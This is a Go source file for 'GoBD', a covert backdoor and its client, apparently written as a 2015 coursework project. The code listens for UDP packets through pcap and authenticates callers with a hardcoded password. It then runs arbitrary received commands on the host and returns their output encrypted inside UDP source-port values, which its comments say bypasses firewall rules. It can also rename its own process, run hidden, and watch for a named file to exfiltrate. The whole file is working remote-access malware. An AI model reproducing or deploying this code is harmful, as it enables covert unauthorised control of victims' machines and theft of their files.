package main
/* bdmain.go
   PROGRAM: GoBD
   AUTHOR: Ramzi Chennafi
   DATE: October 18 2015
   FUNCTIONS:
       main()
       beginListen(ip string, port, lport uint16)
       monitorFile(ip, filename string, port uint16)
       executeServerCommand(data, ip string, port uint16)
       executeCommand(cmd, ip string, port uint16)
   ABOUT:
       bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
   the server and client. The communications are done using UDP and covert data hiding within the source port of the UDP packets.
   All transfers are done using raw sockets and as such, bypass system firewall rules. Furthermore, all data is encrypted with AES-256
   prior to being covertly sent.

   USAGE:
       Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
   two programs can be used across any operating system, commands will be executed the same.
*/
import(
	"os"
	"time"
	"os/exec"
	"bytes"
	"io/ioutil"
	"flag"
	"encoding/binary"
	"fmt"
	"strings"
	"github.com/google/gopacket/layers"
	"runtime"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)
const (
	FPORT = 1
	passwd = "D"; //The authentication code
	MAX_PORT uint16 = 65535
        CLIENT = 1
        SERVER = 0
        SND_CMPLETE uint16 = 3414
	FSND_CMPLETE uint16 = 3415
	FTRANSFER  = 1
	CMD = 0
	HELPSTR= "Client Usage Help\n" +"=================================\n" +
"EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
"Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
)
var (
	authenticatedAddr string //Currently authenticated address
        handle *pcap.Handle
	fhandle *pcap.Handle
	err error
	localip net.IP
	localmac net.HardwareAddr
	destmac net.HardwareAddr
	pType int
)
/* 
    FUNCTION: func main()
    RETURNS: Nothing
    
    ABOUT:
    The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
*/
func main(){

	//flags
	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
		         " client or server. Defaults to client.")
	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
	interfacePtr := flag.String("iface", "wlan0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
	hiddenPtr    := flag.String("visible", "true", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
	dstMacPtr    := flag.String("dMac", "", "Destination mac of the outgoing connection.")
	//flags

	flag.Parse()

	destmac, _ = net.ParseMAC(*dstMacPtr)
	localip = GetLocalIP()
	localmac = GetLocalMAC(*interfacePtr)
	
	if *hiddenPtr == "false" && *modePtr == "server" {

		var procAttr os.ProcAttr 
		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
		
		arguments := make([]string, 7)
		arguments[0] = ""
		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr)
		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr)
		arguments[3] = fmt.Sprintf("-port=%d", *portPtr)
		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr)
		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr)
		arguments[6] = fmt.Sprint("-visible=invalid")
		if runtime.GOOS == "windows"{
			_, err := os.StartProcess("GoBD", arguments, &procAttr)
			checkError(err)
		} else {
			_, err := os.StartProcess("./GoBD", arguments, &procAttr)
			checkError(err)
		}
		return
	}

	intiateTools()
        intiateHandles(*interfacePtr)	

	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
		pType = CLIENT
		intiateClient(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
		break
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
		pType = SERVER
		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
	}
}
/* 
    FUNCTION: intiateHandles(iface string)
    RETURNS: Nothing
    ARGUMENTS: 
                string iface - the interface to monitor

    ABOUT:
    Intiates all packet capture handles for the client. One for the main system and one for the file thread.
*/
func intiateHandles(iface string) {

	handle, err = pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	checkError(err)
	defer handle.Close()

	err = handle.SetBPFFilter("udp")
	checkError(err)

	fhandle, err = pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	checkError(err)
	defer fhandle.Close()

	err = fhandle.SetBPFFilter("udp")
	checkError(err)
}
/* 
    FUNCTION: beginListen(ip string, port, lport uint16)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                uint16 port : port to send data to
                uint16 lport : port to listen for data on

    ABOUT:
    Intiates the listen loop of the program for both the client and server. 
    Will perform differently based on the user specified mode.
*/
func beginListen(ip string, port, lport uint16) {

	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP
	var payload gopacket.Payload

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer, &payload)
	decoded := make([]gopacket.LayerType, 0, 4)
	buffer := new(bytes.Buffer)
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err)

		err = parser.DecodeLayers(packet.Data(), &decoded)
		if err != nil {
			continue
		}

		if len(decoded) < 3 {
			fmt.Println("Not enough layers!")
			continue
		}

		incomingIP := ipLayer.SrcIP.String()
		
		if pType == CLIENT {
			if incomingIP == ip {
				switch uint16(udpLayer.DstPort){

				case lport:
					err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
					checkError(err)
					break;

				case SND_CMPLETE:
					data := decrypt_data(buffer.Bytes())
					fmt.Print(string(data))
					buffer.Reset()
				}
			}
		} else {
			if incomingIP == authenticatedAddr {
				switch uint16(udpLayer.DstPort) {

				case lport:
					err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
					checkError(err)
					break

				case SND_CMPLETE:
					strData := string(decrypt_data(buffer.Bytes()))
					if strings.HasPrefix(strData, "[EXEC]") {
						executeCommand(strData, incomingIP, port);
					}
					if strings.HasPrefix(strData, "[BD]") {
						executeServerCommand(strData, incomingIP, port);
					}
					buffer.Reset()
				}
			} else if uint16(udpLayer.DstPort) == lport {
				
				data := decrypt_data(udpLayer.Payload)
				
				if string(data) == passwd {
					fmt.Printf("Authcode recieved, opening communication with %s\n", incomingIP);
					authenticatedAddr = incomingIP;
					sendEncryptedData(port, "Authentication code verified!\n", ip, CMD)
				}
			}
		}
		
	}
}
/* 
    FUNCTION: executeServerCommand(data, ip string, port uint16) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                uint16 port : port to send data to
                string data : command to execute

    ABOUT:
    Executes incoming client commands on the GoBD program itself. Current commands include:
              setprocess [name]  - sets the process name of the gobd program
              monitor [filename] - monitors for the specified filename, sends when found
              exit - exits the gobd program cleanly
*/
func executeServerCommand(data, ip string, port uint16) {

	fmt.Printf("%s\n", data);

	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
	args := strings.Split(tempstr[1], " ");

	var out string;
	
	switch args[0] {

	case "setprocess" :
		err := SetProcessName(args[1]);
		if err != nil {
			fmt.Printf("%s\n", err);
			out = fmt.Sprintf("%s", err);
		} else {
			out = fmt.Sprintf("Process name set to %s\n", args[1]);
		}
		break;
		
	case "monitor":
		sendEncryptedData(port, "Monitoring file " + args[1] + "...\n", ip, CMD);
		go monitorFile(ip, args[1], port);
		break;

	case "exit" :
		sendEncryptedData(port, "Server exiting...\n", ip, CMD);
		os.Exit(0);
		break;

	default:
		out = "Not a valid command.\n";
	}

	fmt.Printf("%s", out);

	sendEncryptedData(port, out, ip, CMD);	
}
/* 
    FUNCTION: monitorFile(ip, filename string, port uint16)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip       - the ip address of the server
                string filename - the filename to monitor for
                uint16 port     - the port to send data on, adds the FPORT value to this 

    ABOUT:
    Monitors for the filename specified. Once the file is found, the data is sent to the specified ip
    and port (port + FPORT). Exits thread once transfer is finished.
*/
func monitorFile(ip, filename string, port uint16){

	for {
		time.Sleep(1000 * time.Millisecond);
		if _, err := os.Stat(filename); err == nil {
			fmt.Printf("Found file %s\n", filename)

			file, err := ioutil.ReadFile(filename)
			checkError(err)

			sendEncryptedData(port + FPORT, string(file), ip, FTRANSFER)
			return
		}
	}
}
/* 
    FUNCTION: executeCommand(cmd, ip string, port uint16) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                uint16 port : port to send data to
                string cmd : command to execute

    ABOUT:
    Executes incoming client commands on the host machine. Trims and excess
    nulls and spaces off each argument.
*/
func executeCommand(cmd, ip string, port uint16){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	for i, str := range args {
		args[i] = strings.Trim(str, " \x00")
	}	
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]), ip, CMD);
}
